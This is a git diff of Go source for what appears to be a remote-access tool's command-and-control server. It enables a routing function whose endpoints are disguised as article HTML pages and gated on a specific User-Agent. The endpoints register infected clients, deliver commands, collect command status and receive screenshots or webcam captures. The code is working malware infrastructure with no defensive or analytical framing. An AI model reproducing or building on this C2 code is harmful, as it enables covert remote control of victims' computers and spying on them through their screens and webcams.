@@ -8,7 +8,6 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
-	"github.com/gorilla/mux"
 	"html"
 	"html/template"
 	"io"
@@ -18,6 +17,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/gorilla/mux"
 )
 
 //func redirect(w http.ResponseWriter, req *http.Request) {
@@ -208,38 +209,38 @@ func GoServerWithFrontend() {
 	Log.Println("Server Online")
 }
 
-//func GoServerNoFrontend() {
-//	Log.Println("Starting MUX Routing...")
-//	router := mux.NewRouter()
-//	//Client Stuff
-//	router.HandleFunc("/ping", ping)
-//	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)       //New Client Connection
-//	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)     //Check Client Commands
-//	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)   //Tell C2 if Client finished Command
-//	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent) //Update Clients Screenshot or Webcam
-//	//Test
-//	router.HandleFunc("/test", FormTest)
-//	router.HandleFunc("/ip", ip)
-//	//Backend stuff
-//	router.NotFoundHandler = http.HandlerFunc(notFound)
-//
-//	Server := &http.Server{
-//		Handler:      router,
-//		Addr:         ":" + serverPort,
-//		WriteTimeout: time.Second * 15,
-//		ReadTimeout:  time.Second * 15,
-//		IdleTimeout:  time.Second * 60,
-//	}
-//
-//	if ssl {
-//		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
-//			Log.Println("TLS Server Error: " + Err.Error())
-//		}
-//	} else {
-//		Log.Fatal(Server.ListenAndServe())
-//	}
-//	Log.Println("Server Online")
-//}
+func GoServerNoFrontend() {
+	Log.Println("Starting MUX Routing...")
+	router := mux.NewRouter()
+	//Client Stuff
+	router.HandleFunc("/ping", ping)
+	router.HandleFunc("/articles/{random}/{random}/new.html", newClient).Headers("User-Agent", UserAgent)       //New Client Connection
+	router.HandleFunc("/articles/{random}/{random}/read.html", readClient).Headers("User-Agent", UserAgent)     //Check Client Commands
+	router.HandleFunc("/articles/{random}/{random}/edit.html", statusClient).Headers("User-Agent", UserAgent)   //Tell C2 if Client finished Command
+	router.HandleFunc("/articles/{random}/{random}/images.html", imagesClient).Headers("User-Agent", UserAgent) //Update Clients Screenshot or Webcam
+	//Test
+	router.HandleFunc("/test", FormTest)
+	router.HandleFunc("/ip", ip)
+	//Backend stuff
+	router.NotFoundHandler = http.HandlerFunc(notFound)
+
+	Server := &http.Server{
+		Handler:      router,
+		Addr:         ":" + serverPort,
+		WriteTimeout: time.Second * 15,
+		ReadTimeout:  time.Second * 15,
+		IdleTimeout:  time.Second * 60,
+	}
+
+	if ssl {
+		if Err := Server.ListenAndServeTLS(cert, key); Err != nil {
+			Log.Println("TLS Server Error: " + Err.Error())
+		}
+	} else {
+		Log.Fatal(Server.ListenAndServe())
+	}
+	Log.Println("Server Online")
+}
 
 func ip(w http.ResponseWriter, r *http.Request) {
 	ip := strings.Split(r.RemoteAddr, ":")[0]
@@ -460,7 +461,7 @@ func tasksHandle(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-//TODO FIX COMMAND STRUCTURE TO MATCH NEW METHODS.
+// TODO FIX COMMAND STRUCTURE TO MATCH NEW METHODS.
 func newTaskHandle(w http.ResponseWriter, r *http.Request) {
 	_ = r.ParseForm()
 	userName := getUserName(r)
